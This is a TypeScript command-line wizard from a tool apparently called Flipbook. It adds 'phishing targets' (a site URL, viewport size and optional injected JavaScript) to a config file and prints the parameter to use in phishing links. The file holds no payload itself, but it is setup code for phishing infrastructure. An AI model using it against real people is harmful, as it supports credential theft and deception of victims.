#!/usr/bin/env tsx
/**
 * Interactive CLI tool for adding new phishing targets to targets.json.
 * 
 * **Usage:**
 * ```bash
 * npm run add-target
 * ```
 * 
 * **What it does:**
 * - Prompts for target configuration (name, URL, viewport size, etc.)
 * - Validates input (URL format, positive integers, etc.)
 * - Checks for existing targets and prompts for overwrite confirmation
 * - Saves target to targets.json with proper formatting
 * - Displays payload URL parameter for use in phishing links
 * 
 * **Target Configuration:**
 * - key: Unique identifier used in phishing URLs (?t=<key>)
 * - name: Display name shown in admin UI
 * - url: Target site URL (must be https://)
 * - width: Browser viewport width in pixels
 * - height: Browser viewport height in pixels
 * - inject_js: Optional JavaScript to inject after page load
 */

import { readFile, writeFile } from 'fs/promises';
import { existsSync } from 'fs';
import { join, dirname } from 'path';
import { fileURLToPath } from 'url';
import { input, select } from '@inquirer/prompts';

const __dirname = dirname(fileURLToPath(import.meta.url));
const TARGETS_PATH = join(__dirname, '..', 'targets.json');

/**
 * Loads existing targets from targets.json.
 * Returns empty object if file doesn't exist.
 * 
 * @returns Record of target configurations keyed by target ID
 */
async function loadTargets(): Promise<Record<string, unknown>> {
  if (!existsSync(TARGETS_PATH)) return {};
  const raw = await readFile(TARGETS_PATH, 'utf-8');
  return JSON.parse(raw) as Record<string, unknown>;
}

/**
 * Main function - runs the interactive target creation wizard.
 */
async function main(): Promise<void> {
  console.log('\n=== Flipbook: Add Target ===\n');

  // Prompt for target name (used as key in targets.json and config.json)
  const name = await input({
    message: 'Target name (will be used in config.json):',
    validate: (v) => v.trim().length > 0 || 'Required',
  });

  // Use name as the key
  const key = name.trim();

  // Prompt for target URL (must be valid URL)
  const url = await input({
    message: 'Target URL (must be https://):',
    validate: (v) => {
      try { new URL(v); return true; }
      catch { return 'Invalid URL'; }
    },
  });

  // Prompt for viewport width (must be positive integer)
  const widthStr = await input({
    message: 'Browser viewport width:',
    default: '1920',
    validate: (v) => Number.isInteger(Number(v)) && Number(v) > 0 || 'Must be positive integer',
  });

  // Prompt for viewport height (must be positive integer)
  const heightStr = await input({
    message: 'Browser viewport height:',
    default: '1080',
    validate: (v) => Number.isInteger(Number(v)) && Number(v) > 0 || 'Must be positive integer',
  });

  // Prompt for optional JavaScript injection
  const injectJs = await input({
    message: 'Custom JS to inject (optional, leave blank for none):',
    default: '',
  });

  // Load existing targets
  const targets = await loadTargets();

  // Check if target key already exists
  if (targets[key]) {
    const overwrite = await select({
      message: `Target "${key}" already exists. Overwrite?`,
      choices: [
        { name: 'Yes', value: true },
        { name: 'No', value: false },
      ],
    });
    if (!overwrite) {
      console.log('Aborted.');
      process.exit(0);
    }
  }

  // Build target configuration object
  targets[key] = {
    name: name.trim(),
    url: url.trim(),
    width: parseInt(widthStr, 10),
    height: parseInt(heightStr, 10),
    ...(injectJs.trim() ? { inject_js: injectJs.trim() } : {}),
  };

  // Save to targets.json with pretty formatting
  await writeFile(TARGETS_PATH, JSON.stringify(targets, null, 2), 'utf-8');
  console.log(`\nTarget "${key}" saved to targets.json`);
  console.log(`\nTo use this target, add to config.json: "target": "${key}"`);
}

// Run main function and handle errors
main().catch((err) => {
  console.error(err);
  process.exit(1);
});